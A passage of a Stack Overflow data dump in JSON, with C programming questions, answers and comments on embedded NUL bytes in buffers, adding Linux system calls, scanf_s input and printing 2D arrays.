"creation_date": 1544599124, "post_id": 53736331, "comment_id": 94328434, "body": "&quot;return server respond (as string) char by char&quot; This is NOT correct. If it is not NUL-terminated, it is not a string. You do not have strings, therefore you should not treat them as strings."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1544601289, "post_id": 53736331, "comment_id": 94329297, "body": "@Gerhardh -- note that OP appears to have strings. A <code>char</code> array with embedded null bytes does contain a string, yet maybe not the string expected. OP sample is a null-terminated array that also contains an embedded null byte. There is a string at the start of the buffer that ends with the first <code>\\0</code>, and a second string starting with the character following the first <code>\\0</code> that ends with the final <code>\\0</code>. Treating the whole buffer as a string may lead to surprising results, as in fact happened here."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1544602037, "post_id": 53736331, "comment_id": 94329653, "body": "@DavidBowling Agreed, you can view it that way. But the OP talks about strings with embedded NUL-characters. Not about having multiple strings. I would assume the embedded NUL bytes are a result of the encoding of the data. It seems as if binary data is simply sent as text. Nevertheless, two strings are not one string. So don&#39;t treat them as a string. The correct way would be to handle it as buffers of binary data."}], "answers": [{"comments": [{"owner": {"reputation": 4897, "user_id": 6700019, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1ba979f781d106a9db9b35fc6ff518b2?s=128&d=identicon&r=PG", "display_name": "Masoud Rahimi", "link": "https://stackoverflow.com/users/6700019/masoud-rahimi"}, "edited": false, "score": 0, "creation_date": 1544594265, "post_id": 53736800, "comment_id": 94326626, "body": "Thanks, so you mean with <code>strInput</code> returns the whole buffer from the file?"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "reply_to_user": {"reputation": 4897, "user_id": 6700019, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1ba979f781d106a9db9b35fc6ff518b2?s=128&d=identicon&r=PG", "display_name": "Masoud Rahimi", "link": "https://stackoverflow.com/users/6700019/masoud-rahimi"}, "edited": false, "score": 1, "creation_date": 1544594456, "post_id": 53736800, "comment_id": 94326701, "body": "Yes, up to the newline. You could also use <code>fgets()</code>, but that would include the newline in <code>buffer[]</code> (if there is room for it)."}], "tags": [], "owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "is_accepted": true, "score": 2, "last_activity_date": 1544595785, "last_edit_date": 1544595785, "creation_date": 1544593816, "answer_id": 53736800, "question_id": 53736331, "link": "https://stackoverflow.com/questions/53736331/input-string-consists-of-null-terminating-chars/53736800#53736800", "title": "Input string consists of null terminating chars", "body": "<p>\"Why <code>readChars</code> print all the buffer but <code>strInput</code> not?\"</p>\n\n<p>The <code>readChars()</code> function actually prints all characters as they are read, one at a time, in the function:</p>\n\n<pre><code>while (c != EOF)\n    {\n        printf(\"%c\", c);\n        c = fgetc(fp);\n    }\n</code></pre>\n\n<p>But, the <code>strInput()</code> function prints the contents of <code>buffer[]</code> as a string using the <code>%s</code> conversion specifier:</p>\n\n<pre><code>strInput(fp, buffer, sizeof(buffer));\nprintf(\"Reading with strInput (WRONG): %s\\r\\n\", buffer);\n</code></pre>\n\n<p>Printing stops when an embedded <code>\\0</code> character is encountered this time, because that is what <code>%s</code> does.</p>\n\n<p>Note that <code>c</code> in the <code>readChars()</code> function should be an <code>int</code>, not a <code>char</code>. The <code>fgetc()</code> function returns an <code>int</code> value, and <code>EOF</code> may not be representable in a <code>char</code>.</p>\n\n<p>If you want to see the embedded null bytes, print the characters from <code>buffer[]</code> one at a time:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    FILE *fp = fopen(\"mybuffer.txt\", \"r\");  // should check for open failure\n\n    char buffer[100] = { '\\0' };  // zero to avoid UB when printing all chars\n    fgets(buffer, sizeof buffer, fp);\n//  could just as well use:\n//  strInput(fp, buffer, sizeof(buffer));\n\n    for (size_t i = 0; i &lt; sizeof buffer; i++) {\n        if (buffer[i] == '\\0') {\n            putchar('*');        // some character not expected in input\n        }\n        else {\n            putchar(buffer[i]);\n        }\n    }\n    putchar('\\n');\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 4897, "user_id": 6700019, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1ba979f781d106a9db9b35fc6ff518b2?s=128&d=identicon&r=PG", "display_name": "Masoud Rahimi", "link": "https://stackoverflow.com/users/6700019/masoud-rahimi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 144, "favorite_count": 0, "accepted_answer_id": 53736800, "answer_count": 1, "score": 0, "last_activity_date": 1544595785, "creation_date": 1544590632, "last_edit_date": 1592644375, "question_id": 53736331, "link": "https://stackoverflow.com/questions/53736331/input-string-consists-of-null-terminating-chars", "title": "Input string consists of null terminating chars", "body": "<p>I'm using NanoPB to send an encoded data (array of <code>unsigned char</code>) from a server to a client. I'm mapping each byte as a single <code>char</code>, concatenate them, and next, send as a whole string through a network. In the client side, I have a serial interface that can read the server's response with <code>getc</code> or <code>gets</code>. Problem is the buffer might have <code>null</code>-terminating <code>char</code>s and <code>gets</code> would fail. For example, suppose buffer contains something like this:</p>\n<pre><code>unsigned char buffer[] = {72, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 0, 24, 1, 32, 1, 40, 0};\n</code></pre>\n<p>For simplicity, I wrote the buffer to a file and trying to read it back and reconstruct it (with help of <a href=\"https://stackoverflow.com/questions/26963664/input-string-with-getchar\">this</a>):</p>\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid strInput(FILE *fp, char str[], int nchars) {\n    int i = 0;\n    int ch;\n    while ((ch = fgetc(fp)) != '\\n' &amp;&amp; ch != EOF) {\n        if (i &lt; nchars) {\n            str[i++] = ch;\n        }\n    }\n    str[i] = '\\0';\n}\n\nvoid readChars(FILE *fp)\n{\n    char c = fgetc(fp);\n    while (c != EOF)\n    {\n        printf(&quot;%c&quot;, c);\n        c = fgetc(fp);\n    }\n}\n\n\nint main() {\n    FILE *fp;\n    const char* filepath = &quot;mybuffer.txt&quot;;\n    char c;\n    char buffer[100];\n\n    fp = fopen(filepath, &quot;r+&quot;);    \n    strInput(fp, buffer, sizeof(buffer));\n    printf(&quot;Reading with strInput (WRONG): %s\\r\\n&quot;, buffer);\n    fclose(fp);\n\n    fp = fopen(filepath, &quot;r+&quot;);\n    printf(&quot;Reading char by char: &quot;);\n    readChars(fp);\n    printf(&quot;\\r\\n&quot;);\n    fclose(fp);\n\n    getchar();\n    return 0;\n}\n</code></pre>\n<p>And here is the output:</p>\n<pre><code>Reading with strInput (WRONG): Hello world\nReading char by char: Hello world  (\n</code></pre>\n<p>How can I reconstruct the buffer from that file?\nWhy <code>readChars</code> print all the buffer but <code>strInput</code> not?</p>\n"}, {"tags": ["c", "linux", "linux-kernel", "parameter-passing", "system-calls"], "answers": [{"comments": [{"owner": {"reputation": 157, "user_id": 10383616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/988e85e320272119c3fdb7ef6e7bc11e?s=128&d=identicon&r=PG&f=1", "display_name": "P. Heekang", "link": "https://stackoverflow.com/users/10383616/p-heekang"}, "edited": false, "score": 0, "creation_date": 1544626566, "post_id": 53736692, "comment_id": 94343755, "body": "First, thank you for your answer. However, things are still not going well.  I modified &lt;i&gt;kernel/my_syscall.c&lt;/i&gt;. I added <code>#include &lt;linux&#47;syscalls.h&gt;</code> statement, and change <code>asmlinkage int sys_my_syscall_1(int a)</code> to <code>SYSCALL_DEFINE1(my_syscall_1, int, a)</code>.  Except that, I didn&#39;t change anything.  However, I fail to compile the kernel. I face &quot;undefined reference to &#39;sys_my_syscall_0&#39;&quot;, &quot;undefined reference to &#39;sys_my_syscall_1&#39;&quot;, and &quot;undefined reference to &#39;sys_my_syscall_2&#39;&quot; errors.  How can I solve it?"}, {"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "reply_to_user": {"reputation": 157, "user_id": 10383616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/988e85e320272119c3fdb7ef6e7bc11e?s=128&d=identicon&r=PG&f=1", "display_name": "P. Heekang", "link": "https://stackoverflow.com/users/10383616/p-heekang"}, "edited": false, "score": 0, "creation_date": 1544637918, "post_id": 53736692, "comment_id": 94350300, "body": "@P.Heekang your <code>.tbl</code> file should contain <code>sys_my_syscall_1</code> instead of <code>__sys_my_syscall_1</code> (and similar for the other syscalls). Can you check if change allows you to build the kernel."}, {"owner": {"reputation": 157, "user_id": 10383616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/988e85e320272119c3fdb7ef6e7bc11e?s=128&d=identicon&r=PG&f=1", "display_name": "P. Heekang", "link": "https://stackoverflow.com/users/10383616/p-heekang"}, "edited": false, "score": 0, "creation_date": 1544672204, "post_id": 53736692, "comment_id": 94362004, "body": "Unfortunately, it does not change anything ;-( I still cannot build my kernel"}], "tags": [], "owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "is_accepted": false, "score": 9, "last_activity_date": 1544593159, "creation_date": 1544593159, "answer_id": 53736692, "question_id": 53735886, "link": "https://stackoverflow.com/questions/53735886/how-to-pass-parameters-to-linux-system-call/53736692#53736692", "title": "How to pass parameters to Linux system call?", "body": "<p>You need to tell the build system that your system call requires 2 arguments and that they are of type <code>int</code>. This is so that the scripts that are part of the build system will generate appropriate wrappers for casting the arguments into the type you require. Instead of defining the actual handler like you did, you should use - </p>\n\n<pre><code>SYSCALL_DEFINE2(my_syscall_2, int, a, int, b) // Yes, there is a comma between the types and the argument names\n{\n    printk(\"my_syscall_2 : %d, %d\\n\", a, b);\n    return b;\n}\n</code></pre>\n\n<p><code>SYSCALL_DEFINEx</code> is defined in <a href=\"https://github.com/torvalds/linux/blob/master/include/linux/syscalls.h\" rel=\"noreferrer\">linux/include/linux/syscalls.h</a>.</p>\n\n<p>You can look at an example in <a href=\"https://github.com/torvalds/linux/blob/master/fs/read_write.c\" rel=\"noreferrer\">linux/fs/read_write.c</a></p>\n"}, {"comments": [{"owner": {"reputation": 2648, "user_id": 1151229, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/86bfa79afa6f2c9be4b15a7cc3172181?s=128&d=identicon&r=PG", "display_name": "Brian Peterson", "link": "https://stackoverflow.com/users/1151229/brian-peterson"}, "edited": false, "score": 2, "creation_date": 1599498875, "post_id": 53765421, "comment_id": 112786836, "body": "Seems like Ajay answered your question but you accepted your own answer instead. :("}, {"owner": {"reputation": 197, "user_id": 12512406, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a118e78fa01fb23286d677f8745b4df?s=128&d=identicon&r=PG&f=1", "display_name": "deadLock", "link": "https://stackoverflow.com/users/12512406/deadlock"}, "reply_to_user": {"reputation": 2648, "user_id": 1151229, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/86bfa79afa6f2c9be4b15a7cc3172181?s=128&d=identicon&r=PG", "display_name": "Brian Peterson", "link": "https://stackoverflow.com/users/1151229/brian-peterson"}, "edited": false, "score": 0, "creation_date": 1603877904, "post_id": 53765421, "comment_id": 114172759, "body": "@Brian agreed, this is kind of disrespectful. It would have been better if instead, he had added all this at end of his question in the form of a descriptive extension to Ajay&#39;s solution."}], "tags": [], "owner": {"reputation": 157, "user_id": 10383616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/988e85e320272119c3fdb7ef6e7bc11e?s=128&d=identicon&r=PG&f=1", "display_name": "P. Heekang", "link": "https://stackoverflow.com/users/10383616/p-heekang"}, "is_accepted": true, "score": 5, "last_activity_date": 1544715878, "creation_date": 1544715878, "answer_id": 53765421, "question_id": 53735886, "link": "https://stackoverflow.com/questions/53735886/how-to-pass-parameters-to-linux-system-call/53765421#53765421", "title": "How to pass parameters to Linux system call?", "body": "<p>I found the solution. As @Ajay Brahmakshatriya answered, I should use SYSCALL_DEFINEx macro. And also, I should modify <i>arch/x86/entry/syscalls/syscall_64.tbl</i> as well.</p>\n\n<p>Here's final summary.</p>\n\n<h2>How to add new system calls</h2>\n\n<p>First, modify <i>arch/x86/entry/syscalls/syscall_64.tbl</i> : add those lines below.</p>\n\n<pre><code>335     common     my_syscall_0     __x64_sys_my_syscall_0\n336     common     my_syscall_1     __x64_sys_my_syscall_1\n337     common     my_syscall_2     __x64_sys_my_syscall_2\n</code></pre>\n\n<p>Second, modify <i>include/linux/syscalls.h</i> : add those lines below.</p>\n\n<pre><code>asmlinkage long sys_my_syscall_0(void);\nasmlinkage long sys_my_syscall_1(int);\nasmlinkage long sys_my_syscall_2(int, int);\n</code></pre>\n\n<p>Third, create a new file for implementation. For my case, <i>kernel/my_syscall.c</i>.</p>\n\n<pre><code>#include &lt;linux/syscalls.h&gt;\n#include &lt;linux/kernel.h&gt;\n\nSYSCALL_DEFINE0(my_syscall_0)\n{\n    printk(\"my_syscall_0\\n\");\n    return 0;\n}\n\nSYSCALL_DEFINE1(my_syscall_1, int, a)\n{\n    printk(\"my_syscall_1 : %d\\n\", a);\n    return 0;\n}\n\nSYSCALL_DEFINE2(my_syscall_2, int, a, int, b)\n{\n    printk(\"my_syscall_2 : %d, %d\\n\", a, b);\n    return b;\n}\n</code></pre>\n\n<p>Fourth, add created file to Makefile in its directory. For my case, <i>kernel/Makefile</i>.</p>\n\n<pre><code>...\nobj-y = fork.o exec_domain.o panic.o \\\n        cpu.o exit.o softirq.o resource.o \\\n        sysctl.o sysctl_binary.o capability.o ptrace.o user.o \\\n        signal.o sys.o umh.o workqueue.o pid.o task_work.o \\\n        extable.o params.o \\\n        kthread.o sys_ni.o nsproxy.o \\\n        notifier.o ksysfs.o cred.o reboot.o \\\n        async.o range.o smpboot.o ucount.o \\\n        my_syscall.o\n...\n</code></pre>\n\n<p>Finally, compile and install the kernel. Now, you would be able to see new system calls working well.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/syscall.h&gt;\n\nint main()\n{\n    printf(\"1 : %d\\n\", syscall(335));\n    printf(\"2 : %d\\n\", syscall(336, 1));\n    printf(\"3 : %d\\n\", syscall(337, 2, 3));\n    return 0;\n}\n</code></pre>\n\n<p><i>dmesg</i> command shows me that system calls are working well.</p>\n\n<pre><code># dmesg\nmy_syscall_0\nmy_syscall_1 : 1\nmy_syscall_2 : 2, 3\n</code></pre>\n"}], "owner": {"reputation": 157, "user_id": 10383616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/988e85e320272119c3fdb7ef6e7bc11e?s=128&d=identicon&r=PG&f=1", "display_name": "P. Heekang", "link": "https://stackoverflow.com/users/10383616/p-heekang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 10509, "favorite_count": 4, "accepted_answer_id": 53765421, "answer_count": 2, "score": 6, "last_activity_date": 1572000861, "creation_date": 1544587362, "last_edit_date": 1544686745, "question_id": 53735886, "link": "https://stackoverflow.com/questions/53735886/how-to-pass-parameters-to-linux-system-call", "title": "How to pass parameters to Linux system call?", "body": "<p>I'm a college student studying OS.</p>\n\n<p>I'm trying to add my own system call in Linux kernel, and something is going wrong.</p>\n\n<p>My environment is stated below:</p>\n\n<ul>\n<li>Linux Kernel v.4.19.1</li>\n<li>64-bit Ubuntu LTS 18.04.1 with Intel Core i5-4210M CPU on Oracle VirtualBox 5.2.18</li>\n<li>64-bit Windows 10 Home 1803 as a host machine</li>\n</ul>\n\n<p><br/>\nSince I'm working on x86_64 machine, I started with <i>arch/x86/entry/syscalls/syscall_64.tbl</i>.\nIn Linux kernel v.4.19.1, the last entry is</p>\n\n<pre><code>334     common     rseq             __x64_sys_rseq\n</code></pre>\n\n<p>so I added those three lines below it.</p>\n\n<pre><code>335     common     my_syscall_0     sys_my_syscall_0\n336     common     my_syscall_1     sys_my_syscall_1\n337     common     my_syscall_2     sys_my_syscall_2\n</code></pre>\n\n<p><br/>\nSecond, I added prototypes of functions in <i>include/linux/syscalls.h</i>.</p>\n\n<pre><code>asmlinkage int sys_my_syscall_0(void);\nasmlinkage int sys_my_syscall_1(int);\nasmlinkage int sys_my_syscall_2(int, int);\n</code></pre>\n\n<p><br/>\nThird, I created a new file <i>kernel/my_syscall.c</i> and added implementations of functions.</p>\n\n<pre><code>asmlinkage int sys_my_syscall_0(void)\n{\n    printk(\"my_syscall_0\\n\");\n    return 0;\n}\n\nasmlinkage int sys_my_syscall_1(int a)\n{\n    printk(\"my_syscall_1 : %d\\n\", a);\n    return 0;\n}\n\nasmlinkage int sys_my_syscall_0(int a, int b)\n{\n    printk(\"my_syscall_2 : %d, %d\\n\", a, b);\n    return b;\n}\n</code></pre>\n\n<p><br/>\nThen, I added my_syscall.o in <i>kernel/Makefile</i> to compile <i>kernel/my_syscall.c</i> as well.</p>\n\n<pre><code>obj-y = fork.o exec_domain.o panic.o \\\n        cpu.o exit.o softirq.o resource.o \\\n        sysctl.o sysctl_binary.o capability.o ptrace.o user.o \\\n        signal.o sys.o umh.o workqueue.o pid.o task_work.o \\\n        extable.o params.o \\\n        kthread.o sys_ni.o nsproxy.o \\\n        notifier.o ksysfs.o cred.o reboot.o \\\n        async.o range.o smpboot.o ucount.o \\\n        my_syscall.o\n</code></pre>\n\n<p><br/>\nAfter compilation with <i>make-kpkg</i> and <i>dpkg</i> command, I made a test program.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/syscall.h&gt;\nint main()\n{\n    printf(\"1 : %d\\n\", syscall(335));\n    printf(\"2 : %d\\n\", syscall(336, 1));\n    printf(\"3 : %d\\n\", syscall(337, 2, 3));\n    return 0;\n}\n</code></pre>\n\n<p><br/>\nHowever, the result is weird. <i>dmesg</i> shows me some huge numbers that does not make sense at all.</p>\n\n<pre><code># dmesg\n...\nmy_syscall_0\nmy_syscall_1 : 1111490392\nmy_syscall_2 : 1111490392, 1111490392\n</code></pre>\n\n<p>It seems like it is changing every time I execute the program.</p>\n\n<p><br/>\nObviously, there's some problem in passing parameters. However, <i>strace</i> command shows me that the values are passed well.</p>\n\n<pre><code># strace ./syscall\n...\nsyscall_0x14F(0x7ffd21866538, 0x7ffd21866548, ....) = 0\n...\nsyscall_0x150(0x1, 0, 0, 0, 0x7f9e1562f3a0, ....) = 0\n...\nsyscall_0x14F(0x2, 0x3, 0x7f9e1562f3a0, ....) = 0\n....\n</code></pre>\n\n<p><strong>Brief</strong></p>\n\n<ol>\n<li><p>I made simple system calls.</p></li>\n<li><p>Passing parameter to them are not working as the way they should be.</p></li>\n<li><p>Question : Is there any problem in steps above, in order to add new system call?</p></li>\n<li><p>Question : Is there any issues that I should aware when passing parameters to system call?</p></li>\n</ol>\n\n<p>Thank you in advance. </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 1, "creation_date": 1544589015, "post_id": 53735845, "comment_id": 94325243, "body": "You have two incomplete code fragments.  What exactly <b><i>does</i></b> work, and what exactly <b><i>doesn&#39;t</i></b>?  In either case, you should know that <a href=\"https://stackoverflow.com/questions/5240789/scanf-leaves-the-new-line-char-in-the-buffer\"><code>scanf()</code> leaves input in the input buffer</a>"}, {"owner": {"reputation": 85, "user_id": 7088936, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sxOXO.jpg?s=128&g=1", "display_name": "Frantz Paul", "link": "https://stackoverflow.com/users/7088936/frantz-paul"}, "reply_to_user": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 0, "creation_date": 1544591158, "post_id": 53735845, "comment_id": 94325706, "body": "The commented out code where the user inputs separately works. The one line that uses scanf_s does not work. When I run scanf in Visual Studio, I get an error. That is why I used scanf_s."}, {"owner": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 0, "creation_date": 1544591536, "post_id": 53735845, "comment_id": 94325820, "body": "What&#39;s the error you&#39;re getting with <code>scanf()</code>?  Incidentally, my system compiler is not fully C11 compliant yet and lacks <code>scanf_s()</code>"}, {"owner": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 1, "creation_date": 1544591598, "post_id": 53735845, "comment_id": 94325842, "body": "I hate to ask a stupid question, but you are pressing Enter/Return after you type your input line, right?"}, {"owner": {"reputation": 85, "user_id": 7088936, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sxOXO.jpg?s=128&g=1", "display_name": "Frantz Paul", "link": "https://stackoverflow.com/users/7088936/frantz-paul"}, "reply_to_user": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 0, "creation_date": 1544677511, "post_id": 53735845, "comment_id": 94363053, "body": "The error I was getting was &quot; Severity\tCode\tDescription\tProject\tFile\tLine\tSuppression State Error\tC4996\t&#39;scanf&#39;: This function or variable may be unsafe. Consider using scanf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.&quot; However, I have sense resolved the issue by placing &quot;#pragma warning(disable:4996)&quot; near the top of my code."}], "answers": [{"tags": [], "owner": {"reputation": 85, "user_id": 7088936, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sxOXO.jpg?s=128&g=1", "display_name": "Frantz Paul", "link": "https://stackoverflow.com/users/7088936/frantz-paul"}, "is_accepted": false, "score": 0, "last_activity_date": 1544677775, "creation_date": 1544677775, "answer_id": 53755311, "question_id": 53735845, "link": "https://stackoverflow.com/questions/53735845/how-to-receive-three-inputs-from-user-in-c/53755311#53755311", "title": "How to receive three inputs from user in C", "body": "<p>I have found a solution to the original problem that I posted. Originally, I was not able to use scanf because I kept on receiving this error from VS(Visual Studio), \" Severity    Code    Description Project File    Line    Suppression State Error C4996 'scanf': This function or variable may be unsafe. Consider using scanf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.\"</p>\n\n<p>I did some more researching online and found out that I could bypass this error from VS by pasting the line \"#pragma warning(disable:4996)\" near the top of my code. </p>\n\n<p>The code works fine now with scanf. </p>\n"}], "owner": {"reputation": 85, "user_id": 7088936, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sxOXO.jpg?s=128&g=1", "display_name": "Frantz Paul", "link": "https://stackoverflow.com/users/7088936/frantz-paul"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 52, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1544677775, "creation_date": 1544587091, "question_id": 53735845, "link": "https://stackoverflow.com/questions/53735845/how-to-receive-three-inputs-from-user-in-c", "title": "How to receive three inputs from user in C", "body": "<p>I'm having an issue with this piece of code. When I enter the input(Ex. 150.79 - 789.4) the program does not do anything. It does not even stop running, it continues running. Does anybody know what I'm doing wrong?</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n    int main(void)\n    {\n    float value1, value2;\n    char operator, ch;\n    printf(\"Type in your expression.\\n\");\n\n    scanf_s(\"%f %c %f\", &amp;value1, &amp;operator, &amp;value2);\n</code></pre>\n\n<p>When I try to receive input this way, it works.</p>\n\n<pre><code>    //This version works...\n    /*\n    scanf_s(\"%f\", &amp;value1);\n    ch = getchar();\n    scanf_s(\"%c\", &amp;operator);\n    scanf_s(\"%f\", &amp;value2);\n    */\n\n    switch (operator)\n    {\n    case '+':\n    printf (\"%.2f\\n\", value1 + value2);\n    break;\n    case '-':\n        printf(\"%.2f\\n\", value1 - value2);\n        break;\n    case '*':\n        printf(\"%.2f\\n\", value1 * value2);\n        break;\n    case '/':\n        if (value2 == 0)\n            printf(\"Division by zero.\\n\");\n        else\n            printf(\"%.2f\\n\", value1 / value2);\n        break;\n    default:\n        printf(\"Unknown operator.\\n\");\n        break;\n    }\n\n    system(\"pause\");\n    return 0;\n    }\n</code></pre>\n"}, {"tags": ["c", "function", "multidimensional-array", "printf", "2d"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544586081, "post_id": 53735643, "comment_id": 94324606, "body": "Review <code>for (k = 0; k &lt; COLS; k++)     {         printf(&quot;%d &quot;, aRRay[r][c]);</code>.  Why <code>c</code> in <code>aRRay[r][c])</code>?"}, {"owner": {"reputation": 1, "user_id": 10778779, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd80e28250fdcbb204d6b56487254397?s=128&d=identicon&r=PG&f=1", "display_name": "doktte", "link": "https://stackoverflow.com/users/10778779/doktte"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544588756, "post_id": 53735643, "comment_id": 94325192, "body": "I&#39;m confused on what to type inside of my print function to get aRRay[r][c] to print with the random numbers I initialized in function main"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544601348, "post_id": 53735643, "comment_id": 94329321, "body": "You&#39;ll have to start by de-obfuscating the code and use proper indention."}], "answers": [{"tags": [], "owner": {"reputation": 19, "user_id": 10695899, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a66131b3a878892a3c9ee276c2fcc24c?s=128&d=identicon&r=PG&f=1", "display_name": "J. Doe", "link": "https://stackoverflow.com/users/10695899/j-doe"}, "is_accepted": false, "score": 0, "last_activity_date": 1544586207, "creation_date": 1544586207, "answer_id": 53735741, "question_id": 53735643, "link": "https://stackoverflow.com/questions/53735643/how-do-i-print-out-a-2d-array-that-is-initialized-in-function-main-in-c/53735741#53735741", "title": "How do I print out a 2D array that is initialized in function main in C?", "body": "<p>int your last fonction <code>{printf(\"%d \", aRRay[r][c]); }</code> do this instead <code>{printf(\"%d \", aRRay[j][k]); }</code>. Because you are doing a loop but you are not using your loop to do anything, so use the j and k to loop in your printf. Hope it helps!!</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1544593782, "last_edit_date": 1544593782, "creation_date": 1544590491, "answer_id": 53736308, "question_id": 53735643, "link": "https://stackoverflow.com/questions/53735643/how-do-i-print-out-a-2d-array-that-is-initialized-in-function-main-in-c/53736308#53736308", "title": "How do I print out a 2D array that is initialized in function main in C?", "body": "<blockquote>\n  <p>How do I print out a 2D array ...?</p>\n</blockquote>\n\n<p>OP's code is amiss: </p>\n\n<pre><code>// printf(\"%d \", aRRay[r][c]);\nprintf(\"%d \", aRRay[j][k]);\n</code></pre>\n\n<p>How it is initialized/assigned is not so important.  Pass the dimensions to the print function first and then the array.</p>\n\n<p>Array dimensions are best typed as <code>size_t</code> than 